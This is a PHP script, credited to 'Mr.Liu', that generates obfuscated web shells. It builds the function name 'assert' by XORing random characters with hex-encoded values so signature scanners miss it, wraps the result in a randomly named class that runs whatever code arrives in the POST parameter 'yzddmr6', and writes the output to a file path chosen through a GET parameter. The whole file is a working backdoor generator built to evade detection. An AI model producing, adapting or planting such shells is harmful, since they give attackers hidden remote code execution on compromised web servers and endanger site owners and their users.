<?php

//code by Mr.Liu
error_reporting(0);
function randomkeys($length) {
    $pattern = '`~-=!@#$%^&*_\/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    for ($i = 0; $i < $length; $i++) {
        $key[$i] = $pattern{mt_rand(0, strlen($pattern) - 1) }; //生成php随机数
        
    }
    return $key;
}
function randname($length) {
    $pattern = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    for ($i = 0; $i < $length; $i++) {
        @$key.= $pattern{mt_rand(0, strlen($pattern) - 1) }; //生成php随机数
        
    }
    return $key;
}
$str = randomkeys(6);
$bname = randname(4);
$lname = strtolower($bname);
$str2 = "assert";
echo "<?php \n";
echo "error_reporting(0);\n";
echo "class  " . $bname . "{ function " . $lname . "(\$mysql" . "){\n";
for ($i = 0; $i < 6; $i++) {
    $name = "_" . $i;
    $str3[$i] = bin2hex($str[$i] ^ $str2[$i]);
    echo "$" . "$name=";
    echo "'" . $str[$i] . "'" . "^" . "hex2bin" . "('" . $str3[$i] . "');";
    $str4 = hex2bin($str3[$i]);
    echo "        //" . ($str[$i] ^ $str4) . "\n";
}
$aa = "JGNvbmZpZz0kXzAuJF8xLiRfMi4kXzMuJF80LiRfNTs="; //转义字符串
echo base64_decode($aa);
echo "\nreturn \$config(\$mysql);}}\n";
echo "\${$lname}=new {$bname}();\n";
echo "\${$lname}->{$lname}(\$_POST['yzddmr6']);\n";
echo "?>\n";
@$file = $_GET['file'];
$html = ob_get_contents();
if (isset($file)) {
    if (file_put_contents($file, $html)) echo "\n\n\n" . $file . "   save success!";
} else {
    echo "Please input the file name like '?file=xxx.txt'";
}
?>

